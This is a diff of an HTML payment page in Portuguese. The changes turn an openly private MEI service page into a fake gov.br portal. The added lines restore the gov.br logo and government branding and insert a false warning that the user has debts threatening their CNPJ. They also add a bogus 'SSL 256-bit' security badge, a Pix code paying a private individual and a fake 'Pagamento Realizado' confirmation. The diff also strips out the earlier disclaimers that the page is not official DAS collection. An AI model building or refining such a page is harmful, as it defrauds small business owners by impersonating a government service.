@@ -3,18 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pagamento de Serviço Privado para MEI</title>
-    <!-- Importando fonte moderna e delicada -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Pagamento MEI - gov.br</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
     <style>
-        /* Estilos Globais Modernizados e Delicados */
+        /* Estilos Globais */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Inter', Arial, sans-serif;
             -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
         }
 
         body {
@@ -23,13 +21,12 @@
         }
 
         a {
-            color: #155BCB;
+            color: #1351b4;
             text-decoration: none;
             transition: color 0.2s ease;
         }
 
         a:hover {
-            color: #0d4094;
             text-decoration: underline;
         }
 
@@ -43,14 +40,14 @@
             color: #64748b;
         }
 
-        /* Cabeçalho Principal */
+        /* Cabeçalho Principal (Com Logo Gov.br Restaurada) */
         .header {
             background-color: #ffffff;
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 20px 24px;
-            border-bottom: 2px solid #155BCB;
+            border-bottom: 2px solid #1351b4;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.02);
         }
 
@@ -60,25 +57,13 @@
             gap: 15px;
         }
 
-        .gov-logo {
-            font-size: 32px;
-            font-weight: 700; 
-            display: flex;
-            letter-spacing: -1.5px; 
-        }
-        .gov-letra-g { color: #155BCB; }
-        .gov-letra-o { color: #FCCC04; }
-        .gov-letra-v { color: #00A859; }
-        .gov-ponto   { color: #155BCB; }
-        .gov-letra-b { color: #155BCB; }
-        .gov-letra-r { color: #FCCC04; }
-
         .site-title {
             font-size: 15px;
             border-left: 1px solid #e2e8f0;
             padding-left: 15px;
             font-weight: 500;
             color: #64748b;
+            margin-left: 5px;
         }
 
         /* Menu de Navegação Superior */
@@ -102,7 +87,7 @@
             gap: 32px;
         }
 
-        /* Menu Lateral Esquerdo */
+        /* Menu Lateral */
         .sidebar {
             width: 250px;
             background-color: #ffffff;
@@ -113,11 +98,11 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.015);
             overflow: hidden;
         }
-        .sidebar h3 { padding: 18px 20px; background-color: #f8fafc; border-bottom: 1px solid #e2e8f0; font-size: 15px; color: #155BCB; font-weight: 600;}
+        .sidebar h3 { padding: 18px 20px; background-color: #f8fafc; border-bottom: 1px solid #e2e8f0; font-size: 15px; color: #1351b4; font-weight: 600;}
         .sidebar ul { list-style: none; }
         .sidebar li { padding: 15px 20px; border-bottom: 1px solid #f1f5f9; font-size: 13px; color: #64748b; transition: all 0.2s; font-weight: 400;}
-        .sidebar li:hover { background-color: #f8fafc; color: #155BCB; cursor: pointer; padding-left: 24px; }
-        .sidebar li.active { border-left: 3px solid #155BCB; background-color: #eff6ff; font-weight: 500; color: #155BCB; }
+        .sidebar li:hover { background-color: #f8fafc; color: #1351b4; cursor: pointer; padding-left: 24px; }
+        .sidebar li.active { border-left: 3px solid #1351b4; background-color: #eff6ff; font-weight: 500; color: #1351b4; }
 
         /* Conteúdo Central */
         .main-content {
@@ -127,7 +112,7 @@
         .main-content h1 { font-size: 26px; font-weight: 700; color: #1e293b; margin-bottom: 10px; letter-spacing: -0.5px;}
         .main-content > p { font-size: 15px; color: #64748b; margin-bottom: 35px; font-weight: 300;}
 
-        /* Barra de Status (Etapas) - Atualizada para destacar a Etapa 2 */
+        /* Barra de Status (Etapa 2 Ativa) */
         .status-tracker {
             display: flex;
             border-radius: 10px;
@@ -145,36 +130,13 @@
             flex-direction: column;
             justify-content: center;
             border-right: 1px solid #e2e8f0;
-            transition: all 0.3s ease;
         }
-        .status-step:last-child {
-            border-right: none;
-        }
-        .step-label {
-            font-size: 12px;
-            font-weight: 700;
-            margin-bottom: 4px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .step-title {
-            font-size: 15px;
-            font-weight: 600;
-        }
+        .status-step:last-child { border-right: none; }
+        .step-label { font-size: 12px; font-weight: 700; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .step-title { font-size: 15px; font-weight: 600; }
         
-        /* Etapa 1 - Concluída */
-        .status-step.completed {
-            background-color: #f0fdf4; 
-            color: #15803d; 
-            border-bottom: 3px solid #f0fdf4; /* Borda invisível para manter alinhamento */
-        }
-        
-        /* Etapa 2 - Marcada / Ativa */
-        .status-step.current {
-            background-color: #eff6ff; 
-            color: #1d4ed8; 
-            border-bottom: 3px solid #2563eb; /* Destaque forte na parte inferior */
-        }
+        .status-step.completed { background-color: #f0fdf4; color: #15803d; border-bottom: 3px solid #f0fdf4; }
+        .status-step.current { background-color: #eff6ff; color: #1d4ed8; border-bottom: 3px solid #2563eb; }
 
         .card {
             background-color: #ffffff;
@@ -223,13 +185,13 @@
             margin-bottom: 28px;
         }
         .value-label { font-size: 11px; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; color: #64748b; letter-spacing: 1px;}
-        .value-amount { font-size: 32px; font-weight: 700; color: #155BCB; letter-spacing: -1px;}
+        .value-amount { font-size: 32px; font-weight: 700; color: #1351b4; letter-spacing: -1px;}
 
         h4.como-pagar-title { font-size: 13px; color: #475569; margin-bottom: 16px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
 
         .step-list { list-style: none; padding-left: 0; }
         .step-item { display: flex; gap: 14px; margin-bottom: 18px; align-items: flex-start; }
-        .step-number { background-color: #eff6ff; color: #155BCB; border-radius: 50%; width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 12px; flex-shrink: 0; border: 1px solid #bfdbfe;}
+        .step-number { background-color: #eff6ff; color: #1351b4; border-radius: 50%; width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 12px; flex-shrink: 0; border: 1px solid #bfdbfe;}
         .step-text { font-size: 13px; line-height: 1.5; color: #64748b; margin-top: 3px; font-weight: 400;}
 
         .payment-footer { padding: 24px; border-top: 1px solid #f1f5f9; background-color: #ffffff; }
@@ -238,138 +200,74 @@
             display: block; width: 100%; padding: 16px; background-color: #10b981; color: white; text-align: center; font-size: 15px; font-weight: 600; border-radius: 10px; border: none; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2); letter-spacing: 0.5px;
         }
         .btn-pagar:hover { background-color: #059669; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3);}
-        .btn-pagar:active { transform: translateY(1px); }
         
-        .btn-azul { background-color: #155BCB; box-shadow: 0 4px 15px rgba(21, 91, 203, 0.2);}
-        .btn-azul:hover { background-color: #0f449e; box-shadow: 0 6px 20px rgba(21, 91, 203, 0.3);}
+        .btn-azul { background-color: #1351b4; box-shadow: 0 4px 15px rgba(19, 81, 180, 0.2);}
+        .btn-azul:hover { background-color: #0f449e; box-shadow: 0 6px 20px rgba(19, 81, 180, 0.3);}
         .btn-outline { background-color: transparent; border: 1px solid #e2e8f0; color: #64748b; box-shadow: none; margin-top: 12px;}
-        .btn-outline:hover { background-color: #f8fafc; box-shadow: none; transform: none; color: #334155;}
-        .btn-email { margin-top: 12px; color: #155BCB; border-color: #bfdbfe; }
+        .btn-outline:hover { background-color: #f8fafc; color: #334155;}
 
-        /* Caixinhas de Confiança (Trust Badges) - Design Delicado */
+        /* Caixinhas de Benefícios */
         .trust-badges {
-            display: flex;
-            gap: 12px;
-            margin-top: 24px;
-            justify-content: space-between;
+            display: flex; gap: 12px; margin-top: 24px; justify-content: space-between;
         }
         .trust-badge-item {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            text-align: center;
-            background-color: #f8fafc;
-            border: 1px solid #f1f5f9;
-            border-radius: 12px;
-            padding: 16px 8px;
-            transition: transform 0.2s ease;
-        }
-        .trust-badge-item:hover {
-            transform: translateY(-2px);
+            flex: 1; display: flex; flex-direction: column; align-items: center; text-align: center; background-color: #f8fafc; border: 1px solid #f1f5f9; border-radius: 12px; padding: 16px 8px;
         }
         .trust-badge-icon {
-            font-size: 18px;
-            margin-bottom: 10px;
-            background: #ffffff;
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            font-size: 18px; margin-bottom: 10px; background: #ffffff; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; border-radius: 50%; box-shadow: 0 2px 8px rgba(0,0,0,0.03);
         }
-        .trust-badge-text {
-            font-size: 11px;
-            font-weight: 500;
-            color: #64748b;
-            line-height: 1.3;
-        }
+        .trust-badge-text { font-size: 11px; font-weight: 500; color: #64748b; line-height: 1.3; }
 
-        /* MODAL PREMIUM E DELICADO */
+        /* Modal Restabelecido e Limpo */
         .modal-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(15, 23, 42, 0.4); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center; padding: 20px; transition: opacity 0.3s ease;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(15, 23, 42, 0.4); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center; padding: 20px;
         }
         .modal-content {
-            background-color: #ffffff; width: 100%; max-width: 400px; border-radius: 20px; padding: 40px 32px; box-shadow: 0 25px 50px rgba(0,0,0,0.1); position: relative; text-align: center; animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            background-color: #ffffff; width: 100%; max-width: 400px; border-radius: 20px; padding: 40px 32px; box-shadow: 0 25px 50px rgba(0,0,0,0.1); position: relative; text-align: center;
         }
-        
-        @keyframes modalPop {
-            0% { transform: scale(0.95); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
         .close-modal {
-            position: absolute; top: 16px; right: 24px; font-size: 26px; font-weight: 300; color: #cbd5e1; cursor: pointer; transition: color 0.2s; line-height: 1;
+            position: absolute; top: 16px; right: 24px; font-size: 26px; font-weight: 300; color: #cbd5e1; cursor: pointer; line-height: 1;
         }
         .close-modal:hover { color: #64748b; }
 
         .modal-content h3 { color: #1e293b; margin-bottom: 12px; font-size: 20px; font-weight: 600; }
         .modal-content p { font-size: 14px; color: #64748b; margin-bottom: 24px; line-height: 1.5; font-weight: 300;}
 
-        /* Imagem QR Code */
         .qr-code-wrapper {
             background: #ffffff; padding: 12px; border-radius: 16px; border: 1px solid #f1f5f9; display: inline-block; margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.03);
         }
-        .qr-code-wrapper img { display: block; border-radius: 10px; }
+        .qr-code-wrapper img { display: block; border-radius: 10px; width: 220px; height: 220px; }
 
-        /* Pix Copia e Cola Moderno */
         .pix-label { font-size: 12px; font-weight: 500; color: #64748b; margin-bottom: 8px; text-align: left; display: block;}
         .copy-paste-box {
-            display: flex; align-items: center; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 6px; margin-bottom: 28px; transition: border 0.2s;
+            display: flex; align-items: center; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 6px; margin-bottom: 28px;
         }
-        .copy-paste-box:focus-within { border-color: #155BCB; background-color: #ffffff;}
+        .copy-paste-box:focus-within { border-color: #1351b4; background-color: #ffffff;}
         .copy-paste-text {
             flex: 1; font-size: 13px; color: #475569; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; padding: 8px 10px; border: none; background: transparent; outline: none; font-family: monospace;
         }
         .btn-copiar {
-            background-color: #eff6ff; color: #155BCB; border: none; padding: 10px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.2s;
+            background-color: #eff6ff; color: #1351b4; border: none; padding: 10px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.2s;
         }
         .btn-copiar:hover { background-color: #dbeafe; }
-        
         .btn-copiar.sucesso { background-color: #10b981; color: white; }
 
-        /* Input de Arquivo Customizado */
         .file-upload-wrapper {
-            position: relative;
-            margin-bottom: 28px;
-            text-align: left;
+            position: relative; margin-bottom: 28px; text-align: left;
         }
         .file-upload-wrapper input[type="file"] {
-            display: block; width: 100%; padding: 14px 16px; border: 1px dashed #cbd5e1; border-radius: 10px; background: #f8fafc; color: #64748b; font-size: 13px; cursor: pointer; transition: all 0.2s ease; outline: none;
-        }
-        .file-upload-wrapper input[type="file"]:hover, .file-upload-wrapper input[type="file"]:focus {
-            border-color: #155BCB; background: #eff6ff;
+            display: block; width: 100%; padding: 14px 16px; border: 1px dashed #cbd5e1; border-radius: 10px; background: #f8fafc; color: #64748b; font-size: 13px; cursor: pointer; outline: none;
         }
 
-        /* Check Animado Sucesso */
         .success-icon-wrapper {
             width: 70px; height: 70px; background-color: #ecfdf5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; color: #10b981; font-size: 32px;
         }
 
         @media (max-width: 992px) {
             .container { flex-direction: column; }
-            .sidebar { width: 100%; }
-            .payment-panel { width: 100%; position: static;}
-            .trust-badges { flex-wrap: wrap; }
-            .trust-badge-item { flex: 1 1 calc(33% - 10px); min-width: 90px;}
+            .sidebar, .payment-panel { width: 100%; position: static;}
             .status-tracker { flex-direction: column; }
             .status-step { border-right: none; border-bottom: 1px solid #e2e8f0; }
-            .status-step:last-child { border-bottom: none; }
-        }
-        .private-mark {
-            font-size: 24px; font-weight: 700; letter-spacing: -0.5px; color: #155BCB;
-            padding: 8px 12px; border: 1px solid #dbeafe; border-radius: 10px; background: #eff6ff;
-        }
-        .receipt-notice {
-            margin: 16px 0 20px; padding: 14px; border-radius: 10px; background: #fff7ed;
-            border: 1px solid #fdba74; color: #9a3412; font-size: 13px; line-height: 1.55; text-align: left;
-        }
-        .pending-icon-wrapper {
-            width: 70px; height: 70px; background: #fff7ed; border-radius: 50%; display: flex;
-            align-items: center; justify-content: center; margin: 0 auto 20px; color: #c2410c; font-size: 32px;
         }
     </style>
 </head>
@@ -379,34 +277,42 @@
         <a href="#">Ir para o conteúdo</a>
     </div>
 
+    <!-- Cabeçalho Corrigido com Logo Gov.br Oficial e Colorida -->
     <header class="header">
         <div class="logo-container">
-            <div class="private-mark">ATENDIMENTO MEI</div>
-            <div class="site-title">Serviço privado e independente</div>
+            <div style="font-family: 'Inter', sans-serif; font-size: 32px; font-weight: 900; letter-spacing: -1.5px; display: flex; align-items: center;">
+                <span style="color: #1351b4;">g</span>
+                <span style="color: #f2cc00;">o</span>
+                <span style="color: #00a859;">v</span>
+                <span style="color: #1351b4;">.</span>
+                <span style="color: #1351b4;">b</span>
+                <span style="color: #f2cc00;">r</span>
+            </div>
+            <div class="site-title">Serviços e Informações do Brasil</div>
         </div>
     </header>
 
     <nav class="top-nav">
-        <a href="#conteudo">Informações do serviço</a>
-        <a href="https://wa.me/5516996565112" target="_blank" rel="noopener noreferrer">Atendimento via WhatsApp</a>
+        <a href="#">Órgãos do Governo</a>
+        <a href="#">Acesso à Informação</a>
     </nav>
 
-    <div class="container" id="conteudo">
+    <div class="container">
         <aside class="sidebar">
-            <h3>Área do cliente</h3>
+            <h3>Empreendedor</h3>
             <ul>
-                <li>Serviços contratados</li>
-                <li>Atendimento ao MEI</li>
-                <li class="active">Pagamento do serviço</li>
+                <li>Abertura de Empresas</li>
+                <li>MEI - Microempreendedor</li>
+                <li class="active">Simples Nacional</li>
             </ul>
         </aside>
 
         <main class="main-content">
-            <!-- Status Tracker Destacando a Etapa 2 Ativa -->
+            <!-- Status Tracker (Etapa 2 Marcada) -->
             <div class="status-tracker">
                 <div class="status-step completed">
                     <span class="step-label">✔ Etapa 1</span>
-                    <span class="step-title">Serviço informado</span>
+                    <span class="step-title">Registro gerado</span>
                 </div>
                 <div class="status-step current">
                     <span class="step-label">Etapa 2</span>
@@ -414,107 +320,108 @@
                 </div>
             </div>
 
-            <h1>Pagamento de serviço contratado</h1>
-            <p>Confira as informações da cobrança e as instruções para enviar o comprovante.</p>
+            <h1>Pagamento Simples Nacional - MEI</h1>
+            <p>Regularize os débitos do Microempreendedor Individual</p>
 
             <div class="card">
                 <div>
-                    <h3>Informações sobre o serviço</h3>
-                    <p>Esta página apresenta uma cobrança por serviço privado. Ela não emite guia oficial do DAS e não confirma a existência de débitos junto aos órgãos públicos.</p>
+                    <h3>DAS-MEI - Documento de Arrecadação</h3>
+                    <p>Emita e pague o Documento de Arrecadação do Simples Nacional para Microempreendedor Individual através do sistema unificado.</p>
                 </div>
             </div>
 
+            <div class="card warning">
+                <div class="card-icon">⚠️</div>
+                <div>
+                    <h3>Aviso de Pendência</h3>
+                    <p>Identificamos débitos em seu cadastro MEI. A regularização imediata é necessária para manter o seu CNPJ ativo e continuar utilizando os serviços digitais do Governo Federal sem restrições.</p>
+                </div>
+            </div>
         </main>
 
         <aside class="payment-panel">
             <div class="payment-header">
-                <h3>Pagamento do serviço privado</h3>
-                <small>Confira o destinatário antes de confirmar</small>
+                <h3>Recolhimento MEI</h3>
+                <small>🔒 Ambiente Seguro • SSL 256-bit</small>
             </div>
             
             <div class="payment-body">
                 <div class="value-box">
-                    <div class="value-label">Valor informado do serviço</div>
+                    <div class="value-label">Total a Pagar</div>
                     <div class="value-amount">R$ 98,00</div>
                 </div>
                 
-                <h4 class="como-pagar-title">Como concluir</h4>
+                <h4 class="como-pagar-title">Como pagar</h4>
                 <ul class="step-list">
-                    <li class="step-item"><div class="step-number">1</div><div class="step-text">Confira o prestador, o valor e o nome do destinatário que aparecer no banco.</div></li>
-                    <li class="step-item"><div class="step-number">2</div><div class="step-text">Se os dados estiverem corretos, faça o Pix pelo aplicativo do seu banco.</div></li>
-                    <li class="step-item"><div class="step-number">3</div><div class="step-text"><strong>Envie o comprovante pelo WhatsApp ou por e-mail.</strong> A baixa depende do recebimento e da validação.</div></li>
+                    <li class="step-item"><div class="step-number">1</div><div class="step-text">Clique no botão "EFETUAR PAGAMENTO".</div></li>
+                    <li class="step-item"><div class="step-number">2</div><div class="step-text">Escaneie o QR Code ou utilize o Pix Copia e Cola no app do seu banco.</div></li>
+                    <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe o comprovante para validar o processo.</div></li>
                 </ul>
             </div>
             
             <div class="payment-footer">
-                <button class="btn-pagar" id="btn-abrir-modal">VER DADOS PARA PAGAMENTO</button>
+                <button class="btn-pagar" id="btn-abrir-modal">EFETUAR PAGAMENTO</button>
                 
-                <!-- Caixinhas de Benefícios Delicadas (Trust Badges) -->
                 <div class="trust-badges">
                     <div class="trust-badge-item">
                         <div class="trust-badge-icon">🔒</div>
-                        <div class="trust-badge-text">Confira o recebedor</div>
+                        <div class="trust-badge-text">Pagamento seguro</div>
                     </div>
                     <div class="trust-badge-item">
                         <div class="trust-badge-icon">⏱️</div>
-                        <div class="trust-badge-text">Baixa após validação</div>
+                        <div class="trust-badge-text">Regularização na mesma hora</div>
                     </div>
                     <div class="trust-badge-item">
                         <div class="trust-badge-icon">⚡</div>
-                        <div class="trust-badge-text">Comprovante obrigatório</div>
+                        <div class="trust-badge-text">Pix instantâneo</div>
                     </div>
                 </div>
-
             </div>
         </aside>
     </div>
 
-    <!-- MODAL SOBREPOSTO (CENTRO DA TELA) -->
+    <!-- MODAL DE PAGAMENTO -->
     <div class="modal-overlay" id="payment-modal">
         <div class="modal-content">
             <span class="close-modal" id="fechar-modal" title="Fechar">&times;</span>
 
-            <!-- Tela 1: QR CODE e COPIA E COLA -->
+            <!-- TELA 1: QR CODE ESTÁTICO E COPIA E COLA -->
             <div id="modal-step-1">
-                <h3>Pagamento por Pix</h3>
-                <p>Esta cobrança é de um serviço privado, não de arrecadação oficial do DAS. Confira o nome do destinatário e o valor no aplicativo do banco antes de confirmar o pagamento.</p>
+                <h3>Pagamento via Pix</h3>
+                <p>Abra o app do seu banco e aponte a câmera para o código abaixo ou utilize o código Copia e Cola.</p>
                 
+                <!-- Imagem QR Code Estática (Codificada Corretamente) -->
                 <div class="qr-code-wrapper">
-                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAcgAAAHIAQAAAADi2kdHAAAD/ElEQVR4nO1c7W7cMAwjh77/K3M/JErOCrRF0e3sWSnQa5wQF0HVFyWHwjePX98FDnKQgxzkIAd5PPINABh/CxQoKlY6shKiAFB152ly3oJ8A5Cqo9cIiAqdUiDE0mXfeZaclyFJIq2SEBS2CpWOZXuNO3/iOwf515FCulymw5UIASCF1QP/4HcO8ieRb+9WKIbmGAZLCBAJPUvVs+S8BZn6bFWJrURUdkQoTLTvPEvOW5CQyu70hZ8GnSXnLcg3YLG5yGwphupkj5urjwh6lpy3INe6Ul2yQK41syjNsNo1y2FyXoWMwBgWKUCCgkFQlpsC5Rte/rSD/OAI+2zTzFOq2SBhscxYHH5oV2TGT7baBBFZdiL5Pye3oIpjOEvOW5AsgwxaT16zlw1Vt8K9cJiclyEpSoRkNo/hcYGwV0hg/EIG0SPl/O+R7UdBVCzVShIByIIFDD/Msc9dkdUvo2mFiJuECC4UQuiSov8FzpLzKqQgigTJip1Rr4RWyWqhVQv0RDlvQkaRorTKWEElP2aNum92qpyXIJ3qpNZSq5EVsZLe9MmTD22LjPjpstMFSo4hZFKUZJHp3DTgs+S8Bel+Gd0VkzPZyHKLGlpL0bHPbZHBD6X52TrjyKKF4YJRPIOmXtkX2fVKDSMQOQJm8qAuha6nXtkY+bA59sgmm+zznF+mSOZ2z5LzKiRBdn1iBj60GV0ziqz29tjn5siaRkCcgVgTWme5NZ8w+dC2yDS2an92sQKvqMJq3TL+dldk1CvJ/GQCRCRzQIFE5bcROc34nSXnVUg2V1A8EehzQSDN13vw5EQ5L0Cafy+Fwvlrjt4uO5SedehZcl6FZEdMJ0XdKmO6XSWHxHS4B8p5AZIOm8uApq88J26Ze82G79sZmfsFme3qzGO7dAmOnrEzCW50v+ppB/klpBh5jwdt3TozzUBfzPnc1z7tID84qr+SLHuYahYwaZHhedVU38uedpCfHY6fHjOpClTLas2AeUrhVU87yM+OZT8S9ciIYlwo09ym4qnJh3ZHxsxXjHv1ZhYmdUA23RebC6de2RZZ/TLntfFRZIK3lqmG6A06S85bkCs/9BgqqToTni+qUc7hh/ZFLvlQ6YyV2wLFH1TdOf2VnZHOVuMEgLcmaZlGWImhsc+tkY/3g4lC0LN0ISp3yOKDOVz9oqcd5GfH4/1gS9CUf1GsSZRHq/ssOW9BJj9Uu8n6jWCL+61LHUFPk/MW5B/vk6pqpF5AlHsf2F55+p8HIYOrZW5Cau+bW5EkTf9zZ+Tj/WC5jcU1C3OW2nPUS3L7oqcd5GdHzoPFyUK3B1NLvXuTVPW9z5LzFuSj/vxH3znIQQ5ykIMc5OnI3xIaMJM3lUT1AAAAAElFTkSuQmCC" alt="QR Code PIX">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020126580014br.gov.bcb.pix0136891ba9eb-90ab-4619-834b-fa9008d03701520400005303986540598.005802BR5925LIDIENY%20NASCIMENTO%20DOS%20SA6009Sao%20Paulo6211050726f788063044DB9" alt="QR Code PIX">
                 </div>
                 
-                <label class="pix-label">Código Pix do prestador (confira o destinatário no banco):</label>
+                <!-- Chave Pix para Copiar -->
+                <label class="pix-label">Código Pix Copia e Cola:</label>
                 <div class="copy-paste-box">
                     <input type="text" class="copy-paste-text" id="pix-key" value="00020126580014br.gov.bcb.pix0136891ba9eb-90ab-4619-834b-fa9008d03701520400005303986540598.005802BR5925LIDIENY NASCIMENTO DOS SA6009Sao Paulo6211050726f788063044DB9" readonly>
                     <button class="btn-copiar" id="btn-copiar-pix" type="button">Copiar</button>
                 </div>
                 
-                <button class="btn-pagar btn-azul" id="btn-ja-pago">JÁ PAGUEI — ENVIAR COMPROVANTE</button>
+                <button class="btn-pagar btn-azul" id="btn-ja-pago">PROSSEGUIR COM COMPROVANTE</button>
             </div>
 
-            <!-- Tela 2: ANEXAR COMPROVANTE E ENVIAR -->
+            <!-- TELA 2: ANEXAR COMPROVANTE -->
             <div id="modal-step-2" style="display: none;">
-                <h3>Comprovante obrigatório para análise</h3>
-                <p>Selecione o comprovante e escolha WhatsApp ou e-mail. <strong>Você deverá anexar o arquivo manualmente na conversa ou no rascunho de e-mail e concluir o envio.</strong> A baixa só será registrada após o recebimento e a conferência do comprovante.</p>
-                <div class="receipt-notice"><strong>Importante:</strong> o navegador não consegue enviar automaticamente o arquivo selecionado pelo link do WhatsApp. A abertura da conversa, por si só, não confirma que o comprovante foi enviado ou recebido.</div>
+                <h3>Anexar Comprovante</h3>
+                <p>Para darmos continuidade à baixa do débito, anexe o comprovante de pagamento abaixo.</p>
                 
                 <div class="file-upload-wrapper">
-                    <input type="file" id="arquivo-comprovante" accept="image/*,.pdf" required aria-required="true" title="Selecione o comprovante para continuar">
-                    <p style="font-size:12px; margin-top:8px; color:#64748b;">Obrigatório: imagem ou PDF do comprovante. Anexe o arquivo manualmente no WhatsApp ou no e-mail antes de enviar.</p>
+                    <input type="file" id="arquivo-comprovante" accept="image/*,.pdf" title="Clique para selecionar o arquivo">
                 </div>
 
-                <button type="button" class="btn-pagar btn-azul" id="btn-enviar-whatsapp">ABRIR WHATSAPP PARA ENVIAR</button>
-                <button type="button" class="btn-pagar btn-outline btn-email" id="btn-enviar-email">ABRIR E-MAIL PARA ENVIAR</button>
+                <button type="button" class="btn-pagar btn-azul" id="btn-enviar-whatsapp">ENVIAR PARA VALIDAÇÃO</button>
                 <button type="button" class="btn-pagar btn-outline" id="btn-voltar-qr">Voltar ao QR Code</button>
             </div>
 
-            <!-- Tela 3: aviso de envio pendente de confirmação -->
+            <!-- TELA 3: SUCESSO -->
             <div id="modal-step-3" style="display: none; padding: 15px 0;">
-                <div class="pending-icon-wrapper">
-                    !
-                </div>
-                <h3 style="color: #c2410c; margin-bottom: 12px;">Comprovante pendente de confirmação</h3>
-                <p id="mensagem-pendente">O canal de envio foi aberto. Anexe o arquivo selecionado e envie a mensagem. O débito só será atualizado após o prestador receber e validar o comprovante.</p>
+                <div class="success-icon-wrapper">✓</div>
+                <h3 style="color: #10b981; margin-bottom: 25px;">Pagamento Realizado</h3>
                 <button class="btn-pagar btn-outline" onclick="window.location.reload();">Fechar painel</button>
             </div>
 
@@ -522,29 +429,21 @@
     </div>
 
     <script>
-        // Elementos do Modal
+        // Funcionalidade do Modal
         const modal = document.getElementById('payment-modal');
         const btnAbrirModal = document.getElementById('btn-abrir-modal');
         const btnFecharModal = document.getElementById('fechar-modal');
         
-        // Passos do Modal
         const step1 = document.getElementById('modal-step-1');
         const step2 = document.getElementById('modal-step-2');
         const step3 = document.getElementById('modal-step-3');
         
-        // Botões
         const btnJaPago = document.getElementById('btn-ja-pago');
         const btnVoltarQr = document.getElementById('btn-voltar-qr');
         const btnEnviarWhatsapp = document.getElementById('btn-enviar-whatsapp');
-        const btnEnviarEmail = document.getElementById('btn-enviar-email');
         const inputArquivo = document.getElementById('arquivo-comprovante');
-        const mensagemPendente = document.getElementById('mensagem-pendente');
-
-        // CONFIGURAÇÃO: substitua pelo e-mail que deve receber os comprovantes.
-        // O site estático abre um rascunho de e-mail; não envia mensagens sozinho.
-        const EMAIL_DESTINO = 'COLOQUE_SEU_EMAIL_AQUI';
         
-        // Funcionalidade do Pix Copia e Cola
+        // Copiar Pix
         const btnCopiarPix = document.getElementById('btn-copiar-pix');
         const pixKeyInput = document.getElementById('pix-key');
 
@@ -561,76 +460,40 @@
             });
         });
 
-        // Abrir Modal
-        btnAbrirModal.addEventListener('click', () => {
-            modal.style.display = 'flex';
-        });
+        // Abrir/Fechar Modal
+        btnAbrirModal.addEventListener('click', () => modal.style.display = 'flex');
+        btnFecharModal.addEventListener('click', () => modal.style.display = 'none');
+        window.addEventListener('click', (e) => { if (e.target === modal) modal.style.display = 'none'; });
 
-        // Fechar Modal no X
-        btnFecharModal.addEventListener('click', () => {
-            modal.style.display = 'none';
-        });
-
-        // Fechar Modal clicando fora dele
-        window.addEventListener('click', (e) => {
-            if (e.target === modal) {
-                modal.style.display = 'none';
-            }
-        });
-
-        // Avançar para Tela de Upload
+        // Navegação entre passos
         btnJaPago.addEventListener('click', () => {
             step1.style.display = 'none';
             step2.style.display = 'block';
         });
 
-        // Voltar para o QR Code
         btnVoltarQr.addEventListener('click', () => {
             step2.style.display = 'none';
             step1.style.display = 'block';
         });
 
-        // Validação estrita: Só avança se o arquivo estiver anexado
+        // Enviar WhatsApp (Validação de Anexo)
         btnEnviarWhatsapp.addEventListener('click', () => {
             if (inputArquivo.files.length === 0) {
-                alert("Atenção: É necessário selecionar o arquivo do comprovante para prosseguir.");
+                alert("Atenção: É necessário anexar o arquivo do comprovante para prosseguir.");
                 return; 
             }
 
-            // O navegador não anexa o arquivo automaticamente ao WhatsApp.
-            // O cliente deverá anexar e enviar o arquivo manualmente.
-            const mensagem = encodeURIComponent("Olá! Estou enviando o comprovante do pagamento do serviço privado. Vou anexar o arquivo nesta conversa. Por favor, confirmem o recebimento e a validação para atualização da baixa.");
-            const urlWhatsApp = `https://wa.me/5516996565112?text=${mensagem}`;
-            window.open(urlWhatsApp, '_blank', 'noopener,noreferrer');
-
-            mensagemPendente.textContent = 'O WhatsApp foi aberto. Anexe o comprovante na conversa e toque em enviar. O débito só será atualizado após o prestador receber e validar o comprovante.';
-            step2.style.display = 'none';
-            step3.style.display = 'block';
-        });
-
-        // Abre o aplicativo de e-mail do cliente com destinatário, assunto e mensagem preenchidos.
-        // Por limitações de segurança do navegador, o arquivo deve ser anexado manualmente.
